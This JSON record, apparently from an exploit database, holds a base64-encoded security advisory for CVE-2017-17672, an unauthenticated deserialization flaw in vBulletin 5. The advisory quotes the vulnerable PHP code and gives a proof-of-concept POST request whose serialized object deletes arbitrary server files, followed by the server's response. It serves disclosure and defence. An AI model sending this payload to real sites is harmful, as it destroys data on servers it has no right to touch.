{
    "source": "exploit-database", 
    "exploit": "IyBTU0QgQWR2aXNvcnkg4oCTIHZCdWxsZXRpbiBjYWNoZVRlbXBsYXRlcyBVbmF1dGhlbnRpY2F0ZWQgUmVtb3RlIEFyYml0cmFyeSBGaWxlIERlbGV0aW9uDQpTb3VyY2U6IGh0dHBzOi8vYmxvZ3Muc2VjdXJpdGVhbS5jb20vaW5kZXgucGhwL2FyY2hpdmVzLzM1NzMNCg0KIyMgVnVsbmVyYWJpbGl0eSBTdW1tYXJ5DQpUaGUgZm9sbG93aW5nIGFkdmlzb3J5IGRlc2NyaWJlcyBhIHVuYXV0aGVudGljYXRlZCBkZXNlcmlhbGl6YXRpb24gdnVsbmVyYWJpbGl0eSB0aGF0IGxlYWRzIHRvIGFyYml0cmFyeSBkZWxldGUgZmlsZXMgYW5kLCB1bmRlciBjZXJ0YWluIGNpcmN1bXN0YW5jZXMsIGNvZGUgZXhlY3V0aW9uIGZvdW5kIGluIHZCdWxsZXRpbiB2ZXJzaW9uIDUuDQoNCnZCdWxsZXRpbiwgYWxzbyBrbm93biBhcyB2QiwgaXMg4oCcYSB3aWRlc3ByZWFkIHByb3ByaWV0YXJ5IEludGVybmV0IGZvcnVtIHNvZnR3YXJlIHBhY2thZ2UgZGV2ZWxvcGVkIGJ5IHZCdWxsZXRpbiBTb2x1dGlvbnMsIEluYy4sIGJhc2VkIG9uIFBIUCBhbmQgTXlTUUwgZGF0YWJhc2Ugc2VydmVyLiB2QnVsbGV0aW4gcG93ZXJzIG1hbnkgb2YgdGhlIGxhcmdlc3Qgc29jaWFsIHNpdGVzIG9uIHRoZSB3ZWIsIHdpdGggb3ZlciAxMDAsMDAwIHNpdGVzIGJ1aWx0IG9uIGl0LCBpbmNsdWRpbmcgRm9ydHVuZSA1MDAgYW5kIEFsZXhhIFRvcCAxTSBjb21wYW5pZXMgd2Vic2l0ZXMgYW5kIGZvcnVtcy4gQWNjb3JkaW5nIHRvIHRoZSBsYXRlc3QgVzNUZWNoczEgc3RhdGlzdGljcywgdkJ1bGxldGluIHZlcnNpb24gNCBob2xkcyBtb3JlIHRoYW4gNTUlIG9mIHRoZSB2QnVsbGV0aW4gbWFya2V0IHNoYXJlLCB3aGlsZSB2ZXJzaW9uIDMgYW5kIDUgZGl2aWRlIHRoZSByZW1haW5pbmcgcGVyY2VudGFnZeKAnS4NCg0KIyMgQ3JlZGl0DQpBIHNlY3VyaXR5IHJlc2VhcmNoZXIgZnJvbSwgVFJVRUwgSVQgKCBAdHJ1ZWxfaXQgKSwgaGFzIHJlcG9ydGVkIHRoaXMgdnVsbmVyYWJpbGl0eSB0byBCZXlvbmQgU2VjdXJpdHnigJlzIFNlY3VyaVRlYW0gU2VjdXJlIERpc2Nsb3N1cmUgcHJvZ3JhbS4NCg0KIyMgVmVuZG9yIHJlc3BvbnNlDQpXZSB0cmllZCB0byBjb250YWN0IHZCdWxsZXRpbiBzaW5jZSBOb3ZlbWJlciAyMSAyMDE3LCByZXBlYXRlZCBhdHRlbXB0cyB0byBlc3RhYmxpc2ggY29udGFjdCB3ZW50IHVuYW5zd2VyZWQuIEF0IHRoaXMgdGltZSB0aGVyZSBpcyBubyBzb2x1dGlvbiBvciB3b3JrYXJvdW5kIGZvciB0aGVzZSB2dWxuZXJhYmlsaXRpZXMuDQoNCkNWRTogQ1ZFLTIwMTctMTc2NzINCg0KIyMgVnVsbmVyYWJpbGl0eSBkZXRhaWxzDQpVbnNhZmUgdXNhZ2Ugb2YgUEhQ4oCZcyB1bnNlcmlhbGl6ZSgpIG9uIHVzZXItc3VwcGxpZWQgaW5wdXQgYWxsb3dzIGFuIHVuYXV0aGVudGljYXRlZCBhdHRhY2tlciB0byBkZWxldGUgYXJiaXRyYXJ5IGZpbGVzIGFuZCwgdW5kZXIgY2VydGFpbiBjaXJjdW1zdGFuY2VzLCBleGVjdXRlIGFyYml0cmFyeSBjb2RlIG9uIGEgdkJ1bGxldGluIGluc3RhbGxhdGlvbi4NCg0KdkJfTGlicmFyeV9UZW1wbGF0ZeKAmXMgY2FjaGVUZW1wbGF0ZXMoKSBmdW5jdGlvbiwgd2hpY2ggaXMgYW4gcHVibGljbHkgZXhwb3NlZCBBUEkgd2hpY2ggYWxsb3dzIHRvIGZldGNoIGluZm9ybWF0aW9uIG9uIGEgc2V0IG9mIGdpdmVuIHRlbXBsYXRlcyBmcm9tIHRoZSBkYXRhYmFzZSBpbiBvcmRlciB0byBzdG9yZSB0aGVtIGluc2lkZSBhIGNhY2hlIHZhcmlhYmxlLg0KDQpGaWxlIGNvcmUvdmIvYXBpL3RlbXBsYXRlLnBocCDigJMgZnVuY3Rpb24gY2FjaGVUZW1wbGF0ZXMoKToNCg0KYGBgDQpwdWJsaWMgZnVuY3Rpb24gY2FjaGVUZW1wbGF0ZXMoJHRlbXBsYXRlcywgJHRlbXBsYXRlaWRsaXN0LCAkc2tpcF9iYmNvZGVfc3R5bGUgPSBmYWxzZSwNCiRmb3JjZV9zZXQgPSBmYWxzZSkNCnsNCnJldHVybiB2Ql9MaWJyYXJ5OjppbnN0YW5jZSgndGVtcGxhdGUnKS0+Y2FjaGVUZW1wbGF0ZXMoJHRlbXBsYXRlcywgJHRlbXBsYXRlaWRsaXN0LCAkc2tpcF9iYmNvZGVfc3R5bGUsICRmb3INCmBgYA0KDQpMZXTigJlzIHRha2UgYSBsb29rIGF0ICR0ZW1wbGF0ZWlkbGlzdCDigJMgY29yZS92Yi9saWJyYXJ5L3RlbXBsYXRlLnBocCDigJMgZnVuY3Rpb24gY2FjaGVUZW1wbGF0ZXMoKToNCg0KYGBgYA0KcHVibGljIGZ1bmN0aW9uIGNhY2hlVGVtcGxhdGVzKCR0ZW1wbGF0ZXMsICR0ZW1wbGF0ZWlkbGlzdCwgJHNraXBfYmJjb2RlX3N0eWxlID0gZmFsc2UsDQokZm9yY2Vfc2V0ID0gZmFsc2UpDQp7DQokdmJvcHRpb25zID0gdkI6OmdldERhdGFzdG9yZSgpDQovLyB2Ql9MaWJyYXJ5X1N0eWxlOjpzd2l0Y2hDc3NTdHlsZSgpIG1heSBwYXNzIHVzIGEgdGVtcGxhdGVpZGxpc3QgdGhhdCdzIGFscmVhZHkgdW5zZXJpYWxpemVkLg0KaWYgKCFpc19hcnJheSgkdGVtcGxhdGVpZGxpc3QpKQ0Kew0KICAkdGVtcGxhdGVpZGxpc3QgPSB1bnNlcmlhbGl6ZSgkdGVtcGxhdGVpZGxpc3QpOw0KfQ0KZm9yZWFjaCAoJHRlbXBsYXRlcyBBUyAkdGVtcGxhdGUpDQp7DQogIGlmIChpc3NldCgkdGVtcGxhdGVpZGxpc3RbJHRlbXBsYXRlXSkpDQogIHsNCiAgICR0ZW1wbGF0ZWlkc1tdID0gaW50dmFsKCR0ZW1wbGF0ZWlkbGlzdFskdGVtcGxhdGVdKTsNCiAgfQ0KfQ0KaWYgKCFlbXB0eSgkdGVtcGxhdGVpZHMpKQ0Kew0KICAkdGVtcHMgPSB2Qjo6Z2V0RGJBc3NlcnRvcihhcnJheSgndGl0bGUnLCAndGV4dG9ubHknLCAndGVtcGxhdGVfdW4nLCAndGVtcGxhdGUnKSk7DQogIC8vIGNhY2hlIHRlbXBsYXRlcw0KICBmb3JlYWNoICgkdGVtcHMgYXMgJHRlbXApDQogIHsNCiAgIGlmIChlbXB0eShzZWxmOjokdGVtcGxhdGVjYWNoZVsiJHRlbXBbdGl0bGVdIl0pIE9SICRmb3JjZV9zZXQpDQogICB7DQogICAgc2VsZjo6JHRlbXBsYXRlY2FjaGVbIiR0ZW1wW3RpdGxlXSJdID0gJHRoaXM7DQogICB9DQogIH0NCn0NCmlmICghJHNraXBfYmJjb2RlX3N0eWxlKQ0Kew0KICBzZWxmOjokYmJjb2RlX3N0eWxlID0gYXJyYXkoDQogICAnY29kZScgPT4gJiR0ZW1wbGF0ZWFzc29jWydiYmNvZGVfY29kZV9zdHlsZWlkJ10sDQogICAnaHRtbCcgPT4gJiR0ZW1wbGF0ZWFzc29jWydiYmNvZGVfaHRtbF9zdHlsZWlkJ10sDQogICAncGhwJyA9PiAmJHRlbXBsYXRlYXNzb2NbJ2JiY29kZV9waHBfc3R5bGVpZCddLA0KICAgJ3F1b3RlJyA9PiAmJHRlbXBsYXRlYXNzb2NbJ2JiY29kZV9xdW90ZV9zdHlsZWlkJ10NCiAgKTsNCn0NCn0NCmBgYA0KDQokdGVtbnBsYXRlaWRsaXN0IHZhcmlhYmxlLCB3aGljaCBjYW4gY29tZSBkaXJlY3RseSBmcm9tIHVzZXItaW5wdXQsIGlzIGRpcmVjdGx5IHN1cHBsaWVkIHRvIHVuc2VyaWFsaXplKCksIHJlc3VsdGluZyBpbiBhbiBhcmJpdHJhcnkgZGVzZXJpYWxpemF0aW9uIHByaW1pdGl2ZS4NCg0KIyMgUHJvb2Ygb2YgQ29uY2VwdA0KQnkgc2VuZGluZyB0aGUgZm9sbG93aW5nIFBPU1QgcmVxdWVzdCBhbiB1bmF1dGhlbnRpY2F0ZWQgYXR0YWNrZXIgY2FuIGRlbGV0ZSBmaWxlcyBmcm9tIHRoZSB2aWN0aW1zIHNlcnZlcg0KDQpgYGANClBPU1QgL3ZiNTMzL2FqYXgvYXBpL3RlbXBsYXRlL2NhY2hlVGVtcGxhdGVzIEhUVFAvMS4xDQpIb3N0OiB2YjUzMy50ZXN0DQpQcmFnbWE6IG5vLWNhY2hlDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTNfMCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZQ0KR2Vja28pIENocm9tZS82MS4wLjMxNjMuMTAwIFNhZmFyaS81MzcuMzYNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLC87cT0wLjgNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0LUxhbmd1YWdlOiBpdC1JVCxpdDtxPTAuOCxlbi1VUztxPTAuNixlbjtxPTAuNA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTI1DQogDQp0ZW1wbGF0ZXNbXT0xJnRlbXBsYXRlaWRsaXN0PU86MjA6InZCX0ltYWdlX0ltYWdlTWFnaWNrIjoxOntzOjIwOiIlMDAqJTAwaW1hZ2VmaWxlbG9jYXRpb24iO3M6MTM6Ii9wYXRoL3RvL2ZpbGUiO30NCmBgYA0KDQpUaGUgc2VydmVyIHRoZW4gd2lsbCByZXNwb25kIHdpdGg6DQoNCmBgYA0KSFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBGcmksIDI3IE9jdCAyMDE3IDA5OjI3OjUyIEdNVA0KU2VydmVyOiBBcGFjaGUvMi40LjE4IChVYnVudHUpDQpTZXQtQ29va2llOiBzZXNzaW9uaGFzaD00MDlkOGY0YjE2ZWJiNTU0NzFlNjM1MDk4MzRkMGVmZjsgcGF0aD0vOyBIdHRwT25seQ0KU2V0LUNvb2tpZTogbGFzdHZpc2l0PTE1MDkwOTY0NzI7IHBhdGg9LzsgSHR0cE9ubHkNClNldC1Db29raWU6IGxhc3RhY3Rpdml0eT0xNTA5MDk2NDcyOyBwYXRoPS87IEh0dHBPbmx5DQpTZXQtQ29va2llOiBzZXNzaW9uaGFzaD00NGIxZThkMmQ0MzMwMzFlYzI1MDE2NDk2MzBkZDhiZjsgcGF0aD0vOyBIdHRwT25seQ0KQ2FjaGUtQ29udHJvbDogbWF4LWFnZT0wLG5vLWNhY2hlLG5vLXN0b3JlLHBvc3QtY2hlY2s9MCxwcmUtY2hlY2s9MA0KRXhwaXJlczogU2F0LCAxIEphbiAyMDAwIDAxOjAwOjAwIEdNVA0KTGFzdC1Nb2RpZmllZDogRnJpLCAyNyBPY3QgMjAxNyAwOToyNzo1MiBHTVQNClByYWdtYTogbm8tY2FjaGUNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KQ29udGVudC1MZW5ndGg6IDIxMDENCkNvbm5lY3Rpb246IGNsb3NlDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9VVRGLTgNCiANCnsiZXJyb3JzIjpbWyJ1bmV4cGVjdGVkX2Vycm9yIiwiQ2Fubm90IHVzZSBvYmplY3Qgb2YgdHlwZSB2Ql9JbWFnZV9JbWFnZU1hZ2ljayBhcyBhcnJheSJdXX0NCmBgYA==", 
    "id": "43362", 
    "cves": [
        "CVE-2017-17672"
    ]
}